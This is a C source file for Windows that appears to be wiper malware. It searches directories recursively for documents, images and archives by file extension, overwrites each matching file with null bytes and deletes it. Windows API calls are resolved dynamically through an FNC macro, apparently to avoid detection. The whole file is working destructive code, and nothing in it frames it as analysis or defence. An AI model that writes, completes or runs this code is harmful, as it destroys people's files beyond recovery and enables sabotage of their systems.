#ifdef UNICODE
#undef UNICODE
#endif

#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dynimp.h>
#include <safe_procedures.h>
#include <anarchy.h>
#include <strsafe.h>
#include <misc.h>

char* extensions[] = { "doc", "docx", "pdf", "rar", "zip", "png", "jpg", "bmp", "txt" };

void wipe_file(char *file_name, DWORD wipe_count) {

	DWORD i;
	HANDLE hf;
	DWORD data_size;
	DWORD data_wiped;
	DWORD dwTmp;
	BOOL ret_val;
	char wipe_string[] = "\x0\x0\x0\x0\x0\x0\x0"; // null  bytes

	for (i = 0; i < wipe_count; i++)
	{
		ret_val = SetFileAttributesA(file_name, FILE_ATTRIBUTE_NORMAL);
		if (ret_val || GetLastError() == ERROR_FILE_NOT_FOUND)
			break;
		Sleep(150);
	}

	for (i = 0; i < wipe_count; i++)
	{
		if ((hf = FNC(CreateFileA, "kernel32.dll")(file_name, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL)) != INVALID_HANDLE_VALUE) {
			data_size = GetFileSize(hf, NULL);
			if (data_size == INVALID_FILE_SIZE)
				data_size = 0;

			for (data_wiped = 0; data_wiped < data_size; data_wiped += sizeof(wipe_string))
				FNC(WriteFile, "kernel32.dll")(hf, wipe_string, sizeof(wipe_string), &dwTmp, NULL);
			CloseHandle(hf);
			break;
		}

		Sleep(150);
	}

	// clear

	for (i = 0; i < wipe_count; i++) {
		ret_val = FNC(DeleteFileA, "kernel32.dll")(file_name);
		if (ret_val || GetLastError() == ERROR_FILE_NOT_FOUND)
			break;
		Sleep(150);
	}

}

const char *get_filename_ext(const char *filename) {
	const char *dot = strrchr(filename, '.');
	if (!dot || dot == filename) return "";
	return dot + 1;
}

BOOL explore_dir(char* dir);

BOOL explore_dir(char* dir)
{
	WIN32_FIND_DATA ffd;
	LARGE_INTEGER filesize;
	char* szDir;
	char path[MAX_PATH];
	size_t length_of_arg;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	length_of_arg = strnlen_s(dir, MAX_PATH);
	if (length_of_arg > (MAX_PATH - 3))
	{
		// directory length too long..
		MessageBoxA(nul, "too long", "", MB_OK);
		return FALSE;
	}
	// #red
	szDir = dupcat(dir, "\\*", 0); // its ok 

	hFind = FNC(FindFirstFileA, "kernel32.dll")(szDir, &ffd);
	if (INVALID_HANDLE_VALUE == hFind){
		MessageBoxA(nul, "invalid value", "", MB_OK);
		// return dwError;
		return FALSE;
	}

	do
	{
		if ((strncmp("..", ffd.cFileName, 2) != 0) && (strncmp(".", ffd.cFileName, 1) != 0))
		{
			if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				sprintf(path, "%s\\%s", dir, ffd.cFileName);
				explore_dir(path);
			}
			else
			{
				filesize.LowPart = ffd.nFileSizeLow;
				filesize.HighPart = ffd.nFileSizeHigh;
				sprintf(path, "%s\\%s", dir, ffd.cFileName);
				for (size_t i = 0; i < (sizeof(extensions) / sizeof(char*)); i++)
				{
					if (strncmp(extensions[i], get_filename_ext(ffd.cFileName), strlen(extensions[i])) == 0)
					{
						wipe_file(path, 5);
					}
				}
			}
		}
	} while (FNC(FindNextFileA, "kernel32.dll")(hFind, &ffd) != 0);

	FNC(FindClose, "kernel32.dll")(hFind);
	free(szDir);
	return TRUE;
}

